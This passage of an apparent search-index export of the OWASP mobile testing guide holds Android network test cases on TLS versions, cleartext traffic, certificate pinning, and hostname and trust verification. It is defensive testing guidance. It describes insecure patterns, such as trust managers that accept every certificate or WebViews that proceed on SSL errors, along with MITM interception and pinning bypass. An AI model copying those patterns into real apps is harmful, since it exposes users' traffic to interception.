security provider updates properly, and if it reports to the backend when the application is working with an unpatched security provider. The Android Developer documentation provides different examples showing how to update the Security Provider to prevent SSL exploits.</p> <p>Lastly, make sure that NDK-based applications bind only to a recent and properly patched library that provides SSL/TLS functionality.</p>","tags":["android","L2","test","MSTG-NETWORK-6","masvs-network-1"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0023/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>When you have the source code:</p> <ol> <li>Run the application in debug mode, then create a breakpoint where the app will first contact the endpoint(s).</li> <li>Right click the highlighted code and select <code>Evaluate Expression</code>.</li> <li>Type <code>Security.getProviders()</code> and press enter.</li> <li>Check the providers and try to find <code>GmsCore_OpenSSL</code>, which should be the new top-listed provider.</li> </ol> <p>When you do not have the source code:</p> <ol> <li>Use  Frida for Android to hook <code>java.security.Security.getProviders()</code> or use a script  Frida CodeShare like @platix/get-android-security-provider-mstg-network-6.</li> <li>Determine whether the first provider is <code>GmsCore_OpenSSL</code>.</li> </ol>","tags":["android","L2","test","MSTG-NETWORK-6","masvs-network-1"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/","title":"MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code","text":"","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/#overview","title":"Overview","text":"<p>The Android Network Security Configuration does not provide direct control over specific TLS versions (unlike iOS), and starting with Android 10, TLS v1.3 is enabled by default for all TLS connections.</p> <p>There are still several ways to enable insecure versions of TLS, including:</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/#java-sockets","title":"Java Sockets","text":"<p>An app can obtain an SSLContext using an insecure TLS protocol by calling <code>SSLContext.getInstance(\"TLSv1.1\")</code> and can also enable specific, potentially insecure, protocol versions using the API call <code>javax.net.ssl.SSLSocket.setEnabledProtocols(String[] protocols)</code>.</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/#third-party-libraries","title":"Third-party Libraries","text":"<p>Some third-party libraries, such as OkHttp, Retrofit or Apache HttpClient, provide custom configurations for TLS protocols. These libraries may allow enabling outdated protocols if not carefully managed:</p> <p>For example, using <code>ConnectionSpec.COMPATIBLE_TLS</code> in OkHttp (via <code>okhttp3.ConnectionSpec.Builder.connectionSpecs(...)</code>) can lead to insecure TLS versions, like TLS 1.1, being enabled by default in certain versions. Refer to OkHttp's configuration history for details on supported protocols.</p> <p>The API call <code>okhttp3.ConnectionSpec.Builder.tlsVersions(...)</code> can also be used to set the enabled protocols (OkHttp documentation).</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool on the reverse engineered app targeting calls to APIs setting the TLS protocol.</li> </ol>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/#observation","title":"Observation","text":"<p>The output contains a list of all enabled TLS versions in the above mentioned API calls.</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0217/#evaluation","title":"Evaluation","text":"<p>The test case fails if any insecure TLS version is directly enabled, or if the app enabled any settings allowing the use of outdated TLS versions, such as <code>okhttp3.ConnectionSpec.COMPATIBLE_TLS</code>.</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0218/","title":"MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic","text":"","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0218/#overview","title":"Overview","text":"<p>While static analysis can identify configurations that allow insecure TLS versions, it may not accurately reflect the actual protocol used during live communications. This is because TLS version negotiation occurs between the client (app) and the server at runtime, where they agree on the most secure, mutually supported version.</p> <p>By capturing and analyzing real network traffic, you can observe the TLS version actually negotiated and in use. This approach provides an accurate view of the protocol's security, accounting for the server's configuration, which may enforce or limit specific TLS versions.</p> <p>In cases where static analysis is either incomplete or infeasible, examining network traffic can reveal instances where insecure TLS versions (e.g., TLS 1.0 or TLS 1.1) are actively in use.</p>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0218/#steps","title":"Steps","text":"<ol> <li>Set up  Basic Network Monitoring/Sniffing (for Android) or  Basic Network Monitoring/Sniffing (for iOS).</li> <li>View the TLS version e.g., using  Wireshark.</li> </ol>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0218/#observation","title":"Observation","text":"<p>The output shows the actually used TLS version.</p>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0218/#evaluation","title":"Evaluation","text":"<p>The test case fails if any insecure TLS version is used.</p>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0233/","title":"MASTG-TEST-0233: Hardcoded HTTP URLs","text":"","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0233/#overview","title":"Overview","text":"<p>An Android app may have hardcoded HTTP URLs embedded in the app binary, library binaries, or other resources within the APK. These URLs may indicate potential locations where the app communicates with servers over an unencrypted connection.</p> <p>Warning</p> <p>The presence of HTTP URLs alone does not necessarily mean they are actively used for communication. Their usage may depend on runtime conditions, such as how the URLs are invoked and whether cleartext traffic is allowed in the app's configuration. For example, HTTP requests may fail if cleartext traffic is disabled in the AndroidManifest.xml or restricted by the Network Security Configuration. See  Android App Configurations Allowing Cleartext Traffic.</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0233/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool and look for any <code>http://</code> URLs.</li> </ol>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0233/#observation","title":"Observation","text":"<p>The output contains a list of URLs and their locations within the app.</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0233/#evaluation","title":"Evaluation","text":"<p>The test case fails if any HTTP URLs are confirmed to be used for communication.</p> <p>The presence of hardcoded HTTP URLs does not inherently mean they are used; their actual usage must be validated through careful inspection and testing:</p> <ul> <li>Reverse Engineering: Inspect the code locations where the HTTP URLs are referenced. Determine if they are merely stored as constants or actively used to create HTTP requests through networking APIs like <code>HttpURLConnection</code> or <code>OkHttp</code>.</li> <li>Static Analysis: Analyze the app's configuration to identify whether cleartext traffic is permitted. For example, check the AndroidManifest.xml for <code>android:usesCleartextTraffic=\"true\"</code> or inspect the <code>network_security_config</code>. Refer to  Android App Configurations Allowing Cleartext Traffic for detailed guidance.</li> </ul> <p>Additionally, complement this static inspection with dynamic testing methods:</p> <ul> <li> <p>Dynamic Analysis: Use tools like Frida to hook into networking APIs at runtime. This can reveal how and when the HTTP URLs are used during execution. See  Runtime Use of Network APIs Transmitting Cleartext Traffic for more details.</p> </li> <li> <p>Network Traffic Interception: Capture and analyze network traffic using tools like Burp Suite, mitmproxy, or Wireshark. This approach confirms whether the app connects to the identified HTTP URLs during real-world usage but depends on the tester's ability to exercise the app's functionality comprehensively. See  Cleartext Traffic Observed on the Network.</p> </li> </ul>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0234/","title":"MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets","text":"","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0234/#overview","title":"Overview","text":"<p>This test checks whether an Android app uses <code>SSLSocket</code> without a <code>HostnameVerifier</code>, allowing connections to servers presenting certificates with wrong or invalid hostnames.</p> <p>By default, <code>SSLSocket</code> does not perform hostname verification. To enforce it, the app must explicitly invoke <code>HostnameVerifier.verify()</code> and implement proper checks.</p> <p>Such unsafe implementations can allow an attacker to run a MITM attack with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.</p> <p>Note: The connection succeeds even if the app has a fully secure Network Security Configuration (NSC) in place because <code>SSLSocket</code> is not affected by it.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0234/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool and look for all usages of <code>SSLSocket</code> and <code>HostnameVerifier</code>.</li> </ol>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0234/#observation","title":"Observation","text":"<p>The output contains a list of locations where <code>SSLSocket</code> and <code>HostnameVerifier</code> are used.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0234/#evaluation","title":"Evaluation","text":"<p>The test case fails if the app uses <code>SSLSocket</code> without a <code>HostnameVerifier</code>.</p> <p>Note: If a <code>HostnameVerifier</code> is present, ensure it's not implemented in an unsafe manner. See  Incorrect Implementation of Server Hostname Verification for guidance.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0234/#demos","title":"Demos","text":"<p> MASTG-DEMO-0049: SSLSocket Connection to Wrong Host Server Blocked by HostnameVerifier  MASTG-DEMO-0048: SSLSocket Connection to Wrong Host Server Allowed by Lack of HostnameVerifier </p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0235/","title":"MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic","text":"","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0235/#overview","title":"Overview","text":"<p>Since Android 9 (API level 28) cleartext HTTP traffic is blocked by default (thanks to the default Network Security Configuration) but there are multiple ways in which an application can still send it:</p> <ul> <li>AndroidManifest.xml: Setting the <code>android:usesCleartextTraffic</code> attribute of the <code>&lt;application&gt;</code> tag. Note that this flag is ignored in case the Network Security Configuration is configured.</li> <li>Network Security Configuration: Setting the <code>cleartextTrafficPermitted</code> attribute to <code>true</code> on <code>&lt;base-config&gt;</code> or <code>&lt;domain-config&gt;</code> elements.</li> </ul>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0235/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Obtain the AndroidManifest.xml.</li> <li>Obtain the Network Security Configuration.</li> <li>Read the value of <code>usesCleartextTraffic</code> from the AndroidManifest.xml.</li> <li>Read the value of <code>cleartextTrafficPermitted</code> from the NSC <code>&lt;base-config&gt;</code> element.</li> <li>Read the value of <code>cleartextTrafficPermitted</code> from the NSC <code>&lt;domain-config&gt;</code> elements.</li> </ol>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0235/#observation","title":"Observation","text":"<p>The output contains a list of configurations potentially allowing for cleartext traffic.</p>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0235/#evaluation","title":"Evaluation","text":"<p>The test case fails if cleartext traffic is permitted. This can happen if any of the following is true:</p> <ol> <li>The AndroidManifest sets <code>usesCleartextTraffic</code> to <code>true</code> and there's no NSC.</li> <li>The NSC sets <code>cleartextTrafficPermitted</code> to <code>true</code> in the <code>&lt;base-config&gt;</code>.</li> <li>The NSC sets <code>cleartextTrafficPermitted</code> to <code>true</code> in any <code>&lt;domain-config&gt;</code>.</li> </ol> <p>Note: The test doesn't fail if the AndroidManifest sets <code>usesCleartextTraffic</code> to <code>true</code> and there's a NSC, even if it only has an empty <code>&lt;network-security-config&gt;</code> element. For example:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n&lt;/network-security-config&gt;\n</code></pre>","tags":["android","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0236/","title":"MASTG-TEST-0236: Cleartext Traffic Observed on the Network","text":"","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0236/#overview","title":"Overview","text":"<p>This test intercepts the app's incoming and outgoing network traffic, and checks for any cleartext communication. Whilst the static checks can only show potential cleartext traffic, this dynamic test shows all communication the application definitely makes.</p> <p>Warning</p> <ul> <li>Intercepting traffic on a network level will show all traffic the device performs, not only the single app. Linking the traffic back to a specific app can be difficult, especially when more apps are installed on the device.</li> <li>Linking the intercepted traffic back to specific locations in the app can be difficult and requires manual analysis of the code.</li> <li>Dynamic analysis works best when you interact extensively with the app. But even then there could be corner cases which are difficult or impossible to execute on every device. The results from this test therefore are likely not exhaustive.</li> </ul>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0236/#steps","title":"Steps","text":"<p>You can use one of the following approaches:</p> <ul> <li>Set up  Basic Network Monitoring/Sniffing (for Android) or  Basic Network Monitoring/Sniffing (for iOS) to capture all traffic.</li> <li>Set up  Setting Up an Interception Proxy (for Android) or  Setting up an Interception Proxy (for iOS) to capture all traffic.</li> </ul> <p>Notes:</p> <ul> <li>Interception proxies will show HTTP(S) traffic only. You can, however, use some tool-specific plugins such as Burp-non-HTTP-Extension or other tools like  MITM Relay to decode and visualize communication via XMPP and other protocols.</li> <li>Some apps may not function correctly with proxies like Burp and  ZAP because of certificate pinning. In such a scenario, you can still use basic network sniffing to detect cleartext traffic. Otherwise, you can try to disable pinning (see  Bypassing Certificate Pinning for Android and  Bypassing Certificate Pinning for iOS)</li> </ul>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0236/#observation","title":"Observation","text":"<p>The output contains the captured network traffic.</p>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0236/#evaluation","title":"Evaluation","text":"<p>The test case fails if any clear text traffic originates from the target app.</p> <p>Note: This can be challenging to determine because traffic can potentially come from any app on the device. See the Overview section.</p>","tags":["network","L1","L2","test","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0237/","title":"MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0237</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","L1","L2","test","placeholder","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0237/#draft-description","title":"Draft Description","text":"<p>Cross-platform frameworks (e.g. Flutter, React native, ...), typically have their own implementations for HTTP libraries, where cleartext traffic can be allowed.</p> <p>For more details, check the associated weakness:  Cleartext Traffic</p>","tags":["android","L1","L2","test","placeholder","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0238/","title":"MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0238</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","L1","L2","test","placeholder","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0238/#draft-description","title":"Draft Description","text":"<p>Using Frida, you can trace all traffic of the app, mitigating the limitation of the dynamic analysis that you do not know which app, or which location is responsible for the traffic. Using Frida (and <code>.backtrace()</code>), you can be sure this is from the analyzed app, and know the exact location. A new limitation is then that all relevant networking APIs need to be instrumented.</p> <p>For more details, check the associated weakness:  Cleartext Traffic</p>","tags":["android","L1","L2","test","placeholder","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0239/","title":"MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0239</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","L1","L2","test","placeholder","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0239/#draft-description","title":"Draft Description","text":"<p>This test could also be for MASWE-0049 but we'd need to support multiple weaknesses.</p> <p>For more details, check the associated weakness:  Cleartext Traffic</p>","tags":["android","L1","L2","test","placeholder","MASWE-0050"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0242/","title":"MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration","text":"","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0242/#overview","title":"Overview","text":"<p>Apps can configure certificate pinning using the Network Security Configuration. For each domain, one or multiple digests can be pinned.</p> <p>The goal of this test is to check if the app does not implement certificate pinning using the NSC. However, note that the app may be using other pinning methods covered in other tests.</p>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0242/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Obtain the AndroidManifest.xml ( Obtaining Information from the AndroidManifest), and check if a <code>networkSecurityConfig</code> is set in the <code>&lt;application&gt;</code> tag.</li> <li>Inspect the referenced network security config file, and extract all domains from <code>&lt;domain-config&gt;</code> which have a pin set (<code>&lt;pin-set&gt;</code>).</li> </ol>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0242/#observation","title":"Observation","text":"<p>The output should contain a list of domains which enable certificate pinning.</p>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0242/#evaluation","title":"Evaluation","text":"<p>The test case fails if no <code>networkSecurityConfig</code> is set, or any relevant domain does not enable certificate pinning.</p>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0243/","title":"MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration","text":"","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0243/#overview","title":"Overview","text":"<p>Apps can configure expiration dates for pinned certificates in the Network Security Configuration (NSC) by using the <code>expiration</code> attribute. When a pin expires, the app no longer enforces certificate pinning and instead relies on its configured trust anchors. This means the connection will still succeed if the server presents a valid certificate from a trusted CA (such as a system CA or a custom CA defined in the app's configuration). However, if no trusted certificate is available, the connection will fail.</p> <p>If developers assume pinning is still in effect but don't realize it has expired, the app may start trusting CAs it was never intended to.</p> <p>Example: A financial app previously pinned to its own private CA but, after expiration, starts trusting publicly trusted CAs, increasing the risk of compromise if a CA is breached.</p> <p>The goal of this test is to check if any expiration date is in the past.</p>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0243/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Inspect the AndroidManifest.xml, and check if a <code>networkSecurityConfig</code> is set in the <code>&lt;application&gt;</code> tag. If yes, inspect the referenced file, and extract the expiration dates for every domain.</li> </ol>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0243/#observation","title":"Observation","text":"<p>The output should contain a list of expiration dates for pinned certificates.</p>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0243/#evaluation","title":"Evaluation","text":"<p>The test case fails if any expiration date is in the past.</p>","tags":["android","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0244/","title":"MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic","text":"","tags":["network","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0244/#overview","title":"Overview","text":"<p>There are multiple ways an application can implement certificate pinning, including via the Android Network Security Config, custom TrustManager implementations, third-party libraries, and native code. Since some implementations might be difficult to identify through static analysis, especially when obfuscation or dynamic code loading is involved, this test uses network interception techniques to determine if certificate pinning is enforced at runtime.</p> <p>The goal of this test case is to observe whether a MITM attack can intercept HTTPS traffic from the app. A successful MITM interception indicates that the app is either not using certificate pinning or implementing it incorrectly.</p> <p>If the app is properly implementing certificate pinning, the MITM attack should fail because the app rejects certificates issued by an unauthorized CA, even if the CA is trusted by the system.</p> <p>Testing Tip: While performing the MITM attack, it can be useful to monitor the system logs (see  Monitoring System Logs). If a certificate pinning/validation check fails, an event similar to the following log entry might be visible, indicating that the app detected the MITM attack and did not establish a connection.</p> <p><code>I/X509Util: Failed to validate the certificate chain, error: Pin verification failed</code></p>","tags":["network","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0244/#steps","title":"Steps","text":"<ol> <li>Set up an interception proxy, see  Setting Up an Interception Proxy.</li> <li>Install the application on a device connected to that proxy, and intercept the communication.</li> <li>Extract all domains which were intercepted.</li> </ol>","tags":["network","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0244/#observation","title":"Observation","text":"<p>The output should contain a list of domains for which the interception was successful.</p>","tags":["network","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0244/#evaluation","title":"Evaluation","text":"<p>The test case fails if any relevant domain was intercepted.</p>","tags":["network","L2","test","MASWE-0047"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0282/","title":"MASTG-TEST-0282: Unsafe Custom Trust Evaluation","text":"","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0282/#overview","title":"Overview","text":"<p>This test evaluates whether an Android app uses <code>checkServerTrusted(...)</code> in an unsafe manner as part of a custom <code>TrustManager</code>, causing any connection configured to use that <code>TrustManager</code> to skip certificate validation.</p> <p>Such unsafe implementations can allow an attacker to run a MITM attack with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0282/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool for the app and look for all usages of <code>checkServerTrusted(...)</code>.</li> </ol>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0282/#observation","title":"Observation","text":"<p>The output contains a list of locations where <code>checkServerTrusted(...)</code> is used.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0282/#evaluation","title":"Evaluation","text":"<p>The test fails if <code>checkServerTrusted(...)</code> is implemented in a custom <code>X509TrustManager</code> and does not properly validate server certificates.</p> <p>This includes cases such as:</p> <ul> <li>**Using <code>checkServerTrusted(...)</code> which is error prone, when NSC would be enough.</li> <li>Trust manager that does nothing: overriding <code>checkServerTrusted(...)</code> to accept all certificates without any validation, for example by returning immediately without verifying the certificate chain or by always returning <code>true</code>.</li> <li>Ignoring errors: failing to throw proper exceptions (e.g. <code>CertificateException</code> or <code>IllegalArgumentException</code>) on validation failure, or catching and suppressing them.</li> <li>Using <code>checkValidity()</code> instead of full validation: relying only on <code>checkValidity()</code> checks whether the certificate is expired or not yet valid, but does not verify trust or hostname matching.</li> <li>Explicitly loosening trust: disabling trust checks to accept self-signed or untrusted certificates for convenience during development or testing.</li> <li>Misusing <code>getAcceptedIssuers()</code>: Returning <code>null</code> or an empty array without proper handling may effectively disable issuer validation.</li> </ul> <p>When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation ( Reviewing Decompiled Java Code).</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0283/","title":"MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification","text":"","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0283/#overview","title":"Overview","text":"<p>This test evaluates whether an Android app implements a <code>HostnameVerifier</code> that uses <code>verify(...)</code> in an unsafe manner, effectively turning off hostname validation for the affected connections.</p> <p>Such unsafe implementations can allow an attacker to run a MITM attack with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0283/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Inspect the source code and run a static analysis ( Static Analysis on Android) tool and look for all usages of <code>HostnameVerifier</code>.</li> </ol>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0283/#observation","title":"Observation","text":"<p>The output contains a list of locations where <code>HostnameVerifier</code> is used.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0283/#evaluation","title":"Evaluation","text":"<p>The test fails if the app does not properly validate that the server's hostname matches the certificate.</p> <p>This includes cases such as:</p> <ul> <li>Always accepting hostnames: overriding <code>verify(...)</code> to unconditionally return <code>true</code>, regardless of the actual hostname or certificate.</li> <li>Overly broad matching rules: using permissive wildcard logic that matches unintended domains.</li> <li>Incomplete verification coverage: failing to invoke hostname verification on all SSL/TLS channels, such as those created via <code>SSLSocket</code>, or during renegotiation.</li> <li>Missing manual verification: not performing hostname verification when it is not done automatically, such as when using the low-level <code>SSLSocket</code> API.</li> </ul> <p>When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation ( Reviewing Decompiled Java Code).</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0284/","title":"MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews","text":"","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0284/#overview","title":"Overview","text":"<p>This test evaluates whether an Android app has WebViews that ignore SSL/TLS certificate errors by overriding the <code>onReceivedSslError(...)</code> method without proper validation.</p> <p>The method <code>onReceivedSslError(...)</code> is triggered when a <code>WebView</code> encounters an SSL certificate error while loading a page. By default, the <code>WebView</code> cancels the request to protect users from insecure connections. Overriding this method and calling <code>SslErrorHandler.proceed()</code> without proper validation disables these protection.</p> <p>This effectively bypasses SSL certificate checks in the <code>WebView</code>, exposing the app to MITM attacks using invalid, expired, or self-signed certificates.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0284/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Inspect the source code and run a static analysis ( Static Analysis on Android) tool and look for all usages of <code>onReceivedSslError(...)</code>.</li> </ol>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0284/#observation","title":"Observation","text":"<p>The output contains a list of locations where <code>onReceivedSslError(...)</code> that includes a <code>proceed()</code> is used without exception handling that properly handles SSL errors.</p>","tags":["android","L1","L2","test","MASWE-0052"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0284/#evaluation","title":"Evaluation","text":"<p>The test fails if <code>onReceivedSslError(...)</code> is overridden and certificate errors are ignored without proper validation or user involvement.</p> <p>This includes cases such as:</p> <ul> <li>Unconditionally accepting SSL errors: calling <code>proceed()</code> without checking the nature of the error.</li> <li>Relying only on primary error code: using <code>getPrimaryError()</code> for decision-making, such as proceeding if the primary error is not <code>SSL_UNTRUSTED</code>, which may overlook additional errors in the chain.</li> <li>Suppressing exceptions silently: catching exceptions in <code>onReceivedSslError(...)</code> without calling <code>cancel()</code>, which allows the connection to continue silently.</li> </ul> <p>According to official Android guidance, apps should never call <code>proceed()</code> in response to SSL errors. The correct behavior is to cancel the request to protect users from potentially insecure connections. User prompts are also discouraged, as users cannot reliably evaluate SSL issues.</p> <p>When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code 